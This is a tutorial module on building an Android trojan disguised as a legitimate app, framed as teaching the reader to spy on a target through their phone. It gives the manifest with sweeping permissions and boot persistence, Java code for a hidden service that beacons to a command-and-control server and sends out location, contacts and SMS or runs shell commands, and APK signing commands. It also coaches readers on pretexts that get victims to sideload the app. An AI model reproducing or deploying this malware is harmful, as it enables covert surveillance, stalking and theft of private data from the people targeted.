🧠 The Core Truth

Android phones are computers. They run Linux, have file systems, execute code, and connect to networks. But they're treated as appliances — users install apps without reading permissions, grant access without understanding, and carry them everywhere. A compromised phone is a surveillance device that the victim willingly charges and keeps close.

Everyone carries a radio, camera, microphone, and GPS tracker in their pocket. They call it a phone. If you can install software on it, you own the radio, the camera, the microphone, and the GPS. You don't need to plant a bug — the target plants it on themselves every day. This module teaches you to turn their phone into your eyes and ears.

Method 1: Malicious APK (Social Engineering)

Step 1: Build the Trojan App

We create an app that looks legitimate but contains a hidden payload. The payload runs as a background service, invisible to the user.

=== ANDROID PROJECT STRUCTURE === MyApp/ ├── app/ │ ├── src/main/ │ │ ├── AndroidManifest.xml │ │ ├── java/com/example/myapp/ │ │ │ ├── MainActivity.java ← Legitimate UI │ │ │ └── RatService.java ← Hidden payload │ │ └── res/layout/ │ │ └── activity_main.xml │ └── build.gradle === AndroidManifest.xml (KEY PERMISSIONS) === <manifest> <uses-permission android:name="android.permission.INTERNET" /> <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> <uses-permission android:name="android.permission.RECORD_AUDIO" /> <uses-permission android:name="android.permission.READ_SMS" /> <uses-permission android:name="android.permission.SEND_SMS" /> <uses-permission android:name="android.permission.READ_CONTACTS" /> <uses-permission android:name="android.permission.CAMERA" /> <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /> <application> <activity android:name=".MainActivity"> <intent-filter> <action android:name="android.intent.action.MAIN" /> <category android:name="android.intent.category.LAUNCHER" /> </intent-filter> </activity> <service android:name=".RatService" android:enabled="true" android:exported="false" /> <receiver android:name=".BootReceiver"> <intent-filter> <action android:name="android.intent.action.BOOT_COMPLETED" /> </intent-filter> </receiver> </application> </manifest>
⚠️ Why so many permissions?

Android users are trained to click "Allow" without reading. A flashlight app that asks for camera, microphone, and location seems suspicious — but a "COVID-19 Tracker" or "Dating App" that asks for contacts, location, and SMS seems reasonable. The pretext justifies the permissions. The user complies.

Step 2: The Hidden Service

The RatService runs in the background, invisible to the user. It beacons to the C2 server, receives commands, and executes them.

=== RatService.java === package com.example.myapp; import android.app.Service; import android.content.Intent; import android.os.IBinder; import android.util.Log; import java.net.*; import java.io.*; import org.json.*; public class RatService extends Service { private static final String C2_SERVER = "192.168.1.92"; private static final int C2_PORT = 8443; private static final long BEACON_INTERVAL = 30000; // 30 seconds @Override public int onStartCommand(Intent intent, int flags, int startId) { new Thread(this::beaconLoop).start(); return START_STICKY; // Restart if killed } private void beaconLoop() { while (true) { try { // Connect to C2 Socket socket = new Socket(C2_SERVER, C2_PORT); // Send beacon data JSONObject beacon = new JSONObject(); beacon.put("device", android.os.Build.MODEL); beacon.put("version", android.os.Build.VERSION.RELEASE); beacon.put("battery", getBatteryLevel()); beacon.put("location", getLocation()); OutputStream out = socket.getOutputStream(); out.write(beacon.toString().getBytes()); out.flush(); // Receive command BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); String command = reader.readLine(); // Execute command String result = executeCommand(command); // Send result out.write(result.getBytes()); socket.close(); } catch (Exception e) { Log.e("RAT", "Beacon failed: " + e.getMessage()); } // Sleep with jitter try { Thread.sleep(BEACON_INTERVAL + (long)(Math.random() * 10000)); } catch (InterruptedException e) { break; } } } private String executeCommand(String cmd) { if (cmd.equals("location")) { return getLocation(); } else if (cmd.equals("contacts")) { return getContacts(); } else if (cmd.equals("sms")) { return getSMS(); } else if (cmd.startsWith("shell:")) { return runShell(cmd.substring(6)); } return "Unknown command"; } @Override public IBinder onBind(Intent intent) { return null; } }
Why START_STICKY?

Android kills background services to save memory. START_STICKY tells Android: "Restart this service if you kill it." The user sees nothing. The service restarts automatically. Persistence without root.

Method 2: Build and Sign the APK

Step 3: Compile and Sign

Android requires all APKs to be signed. We create a self-signed certificate — free, instant, and accepted by Android.

=== BUILD COMMANDS (Android Studio or command line) === # 1. Generate signing key keytool -genkey -v -keystore myapp.keystore -alias myapp \ -keyalg RSA -keysize 2048 -validity 10000 # (Enter password, fill in fake details — no verification) # 2. Build release APK ./gradlew assembleRelease # 3. Sign the APK jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \ -keystore myapp.keystore app/build/outputs/apk/release/app-release-unsigned.apk myapp # 4. Align (optimize for Android) zipalign -v 4 app-release-unsigned.apk myapp-release.apk # Result: myapp-release.apk — signed, aligned, ready to install
keytool -genkey -v -keystore myapp.keystore -alias myapp -keyalg RSA -keysize 2048 -validity 10000
Why self-signed works

Google Play requires their certificate. But sideloading (installing from outside Play Store) accepts any certificate. The user just needs to enable "Unknown sources" in settings. Social engineering provides the reason: "This app is too new for the Play Store" or "This is the beta version."

Key Takeaways

  • Android is Linux: Same principles — processes, permissions, network sockets
  • Permissions are the attack surface: Users grant them blindly. Design your pretext to justify the permissions you need.
  • Background services persist: START_STICKY, boot receivers, alarm managers — multiple persistence mechanisms
  • Sideloading bypasses Play Store: Self-signed certificates work. Social engineering enables the install.
  • Emulator testing is safe: Android Studio emulator provides full Android environment without real device risk
